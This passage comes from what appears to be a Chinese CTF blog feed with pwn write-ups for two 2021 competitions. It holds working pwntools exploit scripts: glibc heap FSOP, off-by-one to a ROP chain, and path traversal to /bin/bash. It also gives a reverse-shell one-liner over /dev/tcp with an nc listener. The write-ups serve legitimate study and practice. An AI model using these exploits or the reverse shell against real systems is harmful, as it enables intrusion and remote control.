class="line">payload=payload.ljust(0xc0+0x50,&#x27;\x00&#x27;)</span><br><span class="line">payload+=p64(1)+p64(0)*2+p64(heap_addr+0xd8)+p64(1)+p64(2)+p64(system)</span><br><span class="line">edit(0x200,payload+&#x27;\n&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Your choice : &#x27;,&#x27;1&#x27;)</span><br><span class="line">gdb.attach(io,gdb_args=[&quot;-d&quot;,&quot;../../../pwndbg/glibc-2.23/malloc&quot;])</span><br><span class="line">io.sendlineafter(&#x27;size of it\n&#x27;,&#x27;16&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><p>exp2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn&#x27;)</span><br><span class="line">#io=remote(&#x27;47.108.195.119&#x27; ,20141)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(size,name):</span><br><span class="line">io.sendlineafter(&#x27;Your choice : &#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;size of it\n&#x27;,str(size))</span><br><span class="line">io.sendafter(&#x27;Name?\n&#x27;,name)</span><br><span class="line"></span><br><span class="line">def edit(size,name):</span><br><span class="line">io.sendlineafter(&#x27;Your choice : &#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;size of it\n&#x27;,str(size))</span><br><span class="line">io.sendafter(&#x27;name\n&#x27;,name)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">io.sendlineafter(&#x27;Your choice : &#x27;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">#io.recvuntil(&#x27;\x3a\x1b\x5b\x30\x6d\n&#x27;)</span><br><span class="line">#io.sendline(&#x27;Gleaf&#x27;)</span><br><span class="line">#sleep(0.1)</span><br><span class="line">#io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">#io.sendline(&#x27;f1ag&#x27;)</span><br><span class="line"></span><br><span class="line">heap_addr=int(io.recvuntil(&#x27;\n&#x27;)[:-1],16)+0x90</span><br><span class="line">print(&#x27;heap_addr&#x27;,hex(heap_addr))</span><br><span class="line">add(0x18,&#x27;f1ag\n&#x27;)</span><br><span class="line">edit(0x20,&#x27;a&#x27;*0x18+p64(0x2fc1)+&#x27;\n&#x27;)</span><br><span class="line">add(0x3000,&#x27;f1ag\n&#x27;)</span><br><span class="line"></span><br><span class="line">add(0x50,&#x27;a&#x27;*7+&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-1864-16</span><br><span class="line">libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">gadget=[0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">IOlist=libc_base+libc.symbols[&#x27;_IO_list_all&#x27;]</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">payload=&#x27;a&#x27;*0x50+&#x27;/bin/sh\x00&#x27;+p64(0x60)+p64(0)+p64(IOlist-0x10)+p64(0)+p64(1)</span><br><span class="line">payload=payload.ljust(0xa0+0x50,&#x27;\x00&#x27;)</span><br><span class="line">payload+=p64(heap_addr+0xc8)</span><br><span class="line">payload=payload.ljust(0xc0+0x50,&#x27;\x00&#x27;)</span><br><span class="line">payload+=p64(0)+p64(0)*2+p64(heap_addr+0xd8)+p64(1)+p64(2)+p64(system)</span><br><span class="line">edit(0x200,payload+&#x27;\n&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Your choice : &#x27;,&#x27;1&#x27;)</span><br><span class="line">gdb.attach(io,gdb_args=[&quot;-d&quot;,&quot;../../../pwndbg/glibc-2.23/malloc&quot;])</span><br><span class="line">io.sendlineafter(&#x27;size of it\n&#x27;,&#x27;16&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="4-pwnsky"><a href="#4-pwnsky" class="headerlink" title="4.pwnsky"></a>4.pwnsky</h3><p>这个题一开始我猜测漏洞在加密算法那，但是一直没有找到越界或是溢出的地方，直到提示有花指令(<del>emmm</del>)</p><p>我们先来看一下这个算法，其实也就是将我们输入的值进行异或一下而已</p><p><img src="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211129101613615.png" class="lazyload placeholder" data-srcset="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211129101613615.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211129101613615"></p><p>对于登录的密码，我们只需要动态调试一下即可得出key值，然后将后四个字节与该key异或即可得到密码。</p><p>对于add函数里藏了一个花指令我是着实没有想到，因为我找到了加密函数里的花指令，但又分析了好长时间也没发现漏洞，并且这个函数感觉那么的完整。。。。。。</p><p>通过动态调试，明确函数执行流程，然后patch掉中间跳来跳去的代码比如call，jmp，ret等等，这样花指令就去除了。去除后有一个很明显的off-by-one漏洞，只要我们的输入加密后的前八个字节为0就能多写一个字节的数据。</p><p><img src="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211129104221906.png" class="lazyload placeholder" data-srcset="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211129104221906.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211129104221906"></p><p>后面就是off-by-one的常规操作，只不过程序里的堆十分的乱，需要花时间去慢慢调试。拿到libc_base后通过environ打栈，构造rop。</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">from pwn import*</span><br><span class="line">io=process(&#x27;./pwn&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.arch=&#x27;amd64&#x27;</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line">#gdb.attach(io,&quot;b *$rebase(0x1663)&quot;)</span><br><span class="line"></span><br><span class="line">def add(size,content):</span><br><span class="line">io.sendlineafter(&#x27;$&#x27;,&#x27;add&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;size?\n&#x27;,str(size))</span><br><span class="line">io.send(content)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">io.sendlineafter(&#x27;$&#x27;,&#x27;get&#x27;)</span><br><span class="line">io.sendlineafter(&quot;index?&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">io.sendlineafter(&#x27;$&#x27;,&#x27;del&#x27;)</span><br><span class="line">io.sendlineafter(&quot;index?&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">io.sendline(&#x27;Gleaf&#x27;)</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">io.sendline(&#x27;f1ag&#x27;)</span><br><span class="line">io.sendlineafter(&quot;$&quot;,&#x27;login&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;account:&#x27;,str(0x3e8))</span><br><span class="line">io.sendlineafter(&#x27;password:&#x27;,str(0x18F7D121))</span><br><span class="line">add(0x410,&#x27;\n&#x27;)#0</span><br><span class="line">add(0x18,&#x27;\n&#x27;)#1</span><br><span class="line">dele(0)</span><br><span class="line">add(0x410,&#x27;a&#x27;*7+&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">show(0)</span><br><span class="line">malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">environ=libc.symbols[&#x27;_environ&#x27;]+libc_base</span><br><span class="line">opens=libc.symbols[&#x27;open&#x27;]+libc_base</span><br><span class="line">read=libc.symbols[&#x27;read&#x27;]+libc_base</span><br><span class="line">write=libc.symbols[&#x27;write&#x27;]+libc_base</span><br><span class="line"></span><br><span class="line">add(0x20,&#x27;\n&#x27;)#2</span><br><span class="line">add(0x20,&#x27;\n&#x27;)#3</span><br><span class="line">dele(3)</span><br><span class="line">dele(2)</span><br><span class="line">add(0x20,&#x27;\n&#x27;)#2</span><br><span class="line">show(2)</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">heap_base=u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))-0xbc0a</span><br><span class="line">print(&#x27;heap_base&#x27;,hex(heap_base))</span><br><span class="line"></span><br><span class="line">add(0x2f8,&#x27;\n&#x27;)#3</span><br><span class="line">add(0x3f8,&#x27;\n&#x27;)#4</span><br><span class="line">add(0xb8,&#x27;\n&#x27;)#5</span><br><span class="line">add(0x1f8,&#x27;\n&#x27;)#6</span><br><span class="line"></span><br><span class="line">dele(3)</span><br><span class="line">add(0x2f8,p64(0x5c320f6069898f69)+&#x27;\x00&#x27;*0x2f0)#3</span><br><span class="line">io.send(&#x27;\xf1&#x27;)</span><br><span class="line">dele(4)</span><br><span class="line">add(0x3e8,&#x27;\n&#x27;)#4</span><br><span class="line"></span><br><span class="line">add(0x58,&#x27;\n&#x27;)#7</span><br><span class="line">add(0xb8,&#x27;\n&#x27;)#8</span><br><span class="line">dele(8)</span><br><span class="line">dele(5)#0x3c0</span><br><span class="line">dele(7)#0x380</span><br><span class="line">add(0x58,&#x27;\x00&#x27;*0x30+p64(0xc63b46d4aa52d377)+p64(0xc1^0x151edb8a53e4cae2)+p64(environ^0xf3014ff9682b57e3)+&#x27;\n&#x27;)#5 0x380</span><br><span class="line"></span><br><span class="line">add(0xb8,p64(environ^0x5c320f6069898f69)+&#x27;\n&#x27;)#7 0x3c0</span><br><span class="line">add(0xb8,&#x27;\n&#x27;)#8 environ</span><br><span class="line">show(8)</span><br><span class="line">stack=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))+0x8e-0x3e0</span><br><span class="line">print(&#x27;stack&#x27;,hex(stack))</span><br><span class="line">add(0xb8,&#x27;\n&#x27;)#9</span><br><span class="line">dele(9)</span><br><span class="line">dele(7)</span><br><span class="line">dele(5)</span><br><span class="line">add(0x58,&#x27;\x00&#x27;*0x30+p64(0xc63b46d4aa52d377)+p64(0xc1^0x151edb8a53e4cae2)+p64(stack^0xf3014ff9682b57e3)+&#x27;\n&#x27;)#5</span><br><span class="line">add(0xb8,&#x27;\n&#x27;)#7</span><br><span class="line"></span><br><span class="line">#open(&#x27;/sky_token&#x27;,0)</span><br><span class="line">payload=p64((libc.search(asm(&#x27;pop rdi\nret&#x27;)).next()+libc_base)^0x5c320f6069898f69)</span><br><span class="line">payload+=p64((stack+0x80)^0x0de3d33a0c1220ac)</span><br><span class="line">payload+=p64((libc.search(asm(&#x27;pop rsi\nret&#x27;)).next()+libc_base)^0xa0293be2f9812301)</span><br><span class="line">payload+=p64(0^0x5301d8fbeb89fdcc)</span><br><span class="line">payload+=p64(opens^0xd2f251d00d3adb15)</span><br><span class="line">#read(3,addr,0x30)</span><br><span class="line">payload+=p64((libc.search(asm(&#x27;pop rdi\nret&#x27;)).next()+libc_base)^0xd026e346d0690e92)</span><br><span class="line">payload+=p64(3^0xc63b46d4aa52d377)</span><br><span class="line">payload+=p64((libc.search(asm(&#x27;pop rsi\nret&#x27;)).next()+libc_base)^0x151edb8a53e4cae2)</span><br><span class="line">payload+=p64((stack+0x500)^0xf3014ff9682b57e3)</span><br><span class="line">payload+=p64((0x000000000011c371+libc_base)^0x24f31353a0996c13)</span><br><span class="line">payload+=p64(0x30^0xc65eeeccaee2d74d)</span><br><span class="line">payload+=p64(0x151edb8a53e4caa2)</span><br><span class="line">payload+=p64(read^0x3a40d30a4d0d05e3)</span><br><span class="line">#write(1,addr,0x30)</span><br><span class="line">payload+=p64((libc.search(asm(&#x27;pop rdi\nret&#x27;)).next()+libc_base)^0xd7464026f4300123)</span><br><span class="line">payload+=p64(1^0x69d3b41a51aa9005)</span><br><span class="line">payload+=p64(write^0x4033d7fc54021a4d)</span><br><span class="line">payload+=p64(0x6b6f745f796b732f^0xf2cace7069203b02)</span><br><span class="line">payload+=p64(0x6e65^0xb41208eeeddba63b)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">add(0xb8,payload+&#x27;\n&#x27;)#9</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">i=0</span><br><span class="line">while(i!=10):</span><br><span class="line">try:</span><br><span class="line">io=remote(&#x27;47.108.195.119&#x27; ,20135)</span><br><span class="line">exp()</span><br><span class="line">i+=1</span><br><span class="line">except:</span><br><span class="line">i+=1</span><br><span class="line">io.close()</span><br><span class="line">#exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2021湖湘杯线上</title>
      <link href="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/"/>
      <url>/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h3 id="2021湖湘杯pwn"><a href="#2021湖湘杯pwn" class="headerlink" title="2021湖湘杯pwn"></a>2021湖湘杯pwn</h3><span id="more"></span><h3 id="1-tiny-httpd"><a href="#1-tiny-httpd" class="headerlink" title="1.tiny_httpd"></a>1.tiny_httpd</h3><p>这个题直接给出了源码，分析源码可以发现他会将两个连续的’.’变成一个，并且path是我们可以控制的，这就造成了漏洞。</p><p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116215036500.png" class="lazyload placeholder" data-srcset="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116215036500.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211116215036500"></p><p>路径确定后如果cgi=1那么就会执行文件，如果为0就会查看文件。</p><p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116215345606.png" class="lazyload placeholder" data-srcset="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116215345606.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211116215345606"></p><p>一开始的思路就是利用目录穿越直接查看flag，结果发现seeve_file的file路径被写死。</p><p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116215712832.png" class="lazyload placeholder" data-srcset="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116215712832.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211116215712832"></p><p>所以得利用目录穿越执行/bin/bash,要使其可执行，就必须是cgi=1。要使cgi=1有两种方法，第一种是利用POST请求，第二种方法是利用GET请求但需要加？+参数，但由于并不知道参数名，所以我们只能使用POST的传参。</p><p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116220903194.png" class="lazyload placeholder" data-srcset="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116220903194.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211116220903194"></p><p>使用POST的传参是需要注意，一定要在后面添加content-length。</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=remote(&#x27;127.0.0.1&#x27;,9990)</span><br><span class="line"></span><br><span class="line">payload=&#x27;POST /.../.../.../.../.../.../.../.../.../bin/bash\r\nContent-length: 100\r\n&#x27;</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>但因为程序使用了<code>dup2(cgi_output[1],STDOUT);dup2(cgi_input[0],STDIN);</code>将输入输出重定向了，所以我们并不能得到回显，因此需要我们反弹shell。</p><p>我们先监听要反弹shell的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vnlp port</span><br></pre></td></tr></table></figure><p>在交互下执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>就可以拿到新的shell了。</p><p>关于这个重定向，我找到了写出这个[web服务的作者]( <a href="https://segmentfault.com/a/1190000019820410">C - C语言实现最简单的HTTP服务器 - SegmentFault 思否</a> ),它里面给出了一张图，很直观。</p><p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116224122030.png" class="lazyload placeholder" data-srcset="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116224122030.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211116224122030"></p><p><strong>小插曲</strong>：在看到这个反弹shell的命令时，我问了问fmyyy👴他的原理是啥，他紧接着发了个命令给我</p><p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116221920622.png" class="lazyload placeholder" data-srcset="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116221920622.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211116221920622"></p><p>然后我就天真的执行了（emmmmmmmmmm）</p><p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116222231479.png" class="lazyload placeholder" data-srcset="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211116222231479.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211116222231479"></p><p>好家伙，直接言传身教，学到了，学到了。</p><h3 id="2-双边协议3-0"><a href="#2-双边协议3-0" class="headerlink" title="2.双边协议3.0"></a>2.双边协议3.0</h3><p>还记得双边协议1.0是红名谷杯的题，这个是他的加强版。</p><p>这个题在当时做的时候逆了一天才把他的输入给绕过，赛后得wjh师傅和darry师傅帮助终于把这个题完整的复现了出来。</p><p>我们先看下这个程序他干了什么。</p><ul><li><p>将所有的输出先进行一系列异或操作，然后使用base64加密输出</p></li><li><p>将我们的输入先进行base64解密，解出的前八位是固定字符串’lanlanww‘，第八到第十六位是大小(要求不能大于0x4f),从第16位开始到最后需要对其进行一系列异或解密，解密后的字符被读入。</p></li><li><p>只能允许我们申请0x110大小的chunk。可以对其编辑和删除</p></li><li><p>允许输出堆的内容，但会先将要输出的内容进行一系列异或解密，然后对其惊醒一系列异或加密输出。</p></li><li><p>留有后门函数，可以申请0x2000以上大小的chunk，可以free并且不置0，可以对其进行一次写操作，可以在申请一个0x3918大小的chunk。</p></li><li><p>编辑删除输出都取决于ptr+0x108是否为0</p><p>麻烦的其实就是逆这个异或算法了(对逆向爷来说都是小case)，每轮都会取一个随机数作为密钥key，然后将ptr+0x100内的数据逐个和这个key异或，这个key将会被随机插入到ptr+0x50内的任意一个位置，并且在最后也就是每轮i的位置记录key的位置。直到i=ptr+0xfe</p></li></ul><p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211125211355768.png" class="lazyload placeholder" data-srcset="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211125211355768.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211125211355768"></p><p>正因为i记录了key的位置，因此我们就可以直到每轮key的位置了，因此就可以从后往前将每轮的key值取出，异或回去得到原来的置。解密脚本如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">a=&#x27;d3duYWxuYWwWAAAAAAAAABZ0TQ8cTkxVIkQhUxdLW20mQA5CWQgtF0xJAVJAXXBheyhCPlxhNGoHMkhyNiByaGxbKn12TUBBLVs9ZEpBWxDQ0HtmFAxOBtDQNyjQ0G4qcNBi0BhAARHQ0NDQ0Dl/0NBjZ9DQRDwJ0NB2fxhZI9DQ0EJEdtDQ0NDQBtAY0NA20A3Q0NBj0NAaLNDQYCzQ0NAM0EjQatDQ0C/Q0BvQ0NDQ0NDQ0G3Q0CkpUCs+SyYrOC5xIGIfTXAIcAV6UndRTxQdBzAWZWx9OmhWISdEelxcMHR+YlRXEXl8VTR4UUFYd2VLHiAkMjQ4AUJsHm8aLio+WFYFaVhtTxM1F05VIgg=&#x27;</span><br><span class="line">print(hex(len(a)))</span><br><span class="line">mingwen=base64.b64decode(a.encode())</span><br><span class="line">mingwen=mingwen[16:]</span><br><span class="line">#print(mingwen)</span><br><span class="line">s=[]</span><br><span class="line">for i in mingwen:</span><br><span class="line">   s.append(i)</span><br><span class="line">print(s)</span><br><span class="line">for i in range(0xff,0x4f,-2):</span><br><span class="line">    key = s[s[i]]</span><br><span class="line">    for j in range(i):</span><br><span class="line">        s[j] ^= key</span><br><span class="line">    #dele key</span><br><span class="line">    for k in range(s[i],i):</span><br><span class="line">        s[k] = s[k+1]</span><br><span class="line">string=&#x27;&#x27;</span><br><span class="line">#s=s[:32]</span><br><span class="line">print(s)</span><br><span class="line">for i in s:</span><br><span class="line">    string+=chr(i)</span><br><span class="line">print(string)</span><br></pre></td></tr></table></figure><p>那我们该如何绕过输入呢，我们可以看见每次会从最后将key的位置取出然后和数据异或，因此我们只需要使其取出的值为0即可。因此我们可以这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=&#x27;a&#x27;*0x10</span><br><span class="line">payload=payload.ljust(0x80,&#x27;\x00&#x27;)</span><br><span class="line">payload=payload.ljust(0x100,&#x27;\x12&#x27;)</span><br></pre></td></tr></table></figure><p>本以为可以进行交互这个题就差不多了，但一直泄露不了libc_base，原因是一直被ptr+0x108这里的值给卡住了，最后问了wjh师傅说可以向前溢出，我才发现这里还有一个漏洞。</p><p>一开始我以为_BYTE这个类型是不会存在负值的，但调试发现是有负值的，因此就可以向前溢出，因为获得key之后就会将其删除，从后面补上，如果key的位置在chunk前面，那么只需要补一个值就行，因此就可以将1变成0。</p><p><img src="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211125213128459.png" class="lazyload placeholder" data-srcset="/2021/11/16/2021%E6%B9%96%E6%B9%98%E6%9D%AF%E7%BA%BF%E4%B8%8A/image-20211125213128459.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211125213128459"></p><p>因为远程环境是libc2.23，所以0x120大小的chunk会被放入unsortedbin中，因此我们想到打global_max_fast,利用unsrotedbinattack将global_max_fast改为一个很大的值，然后我们可以利用那个后门函数申请0x3918大小的chunk，因为将此chunkfree后正好就是free_hook的位置，然后改此chunk的fd指针为system函数的地址。最后在申请一下0x3918大小的chunk就可以将free_hook的值覆盖为system的地址了。</p><p>完整exp如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 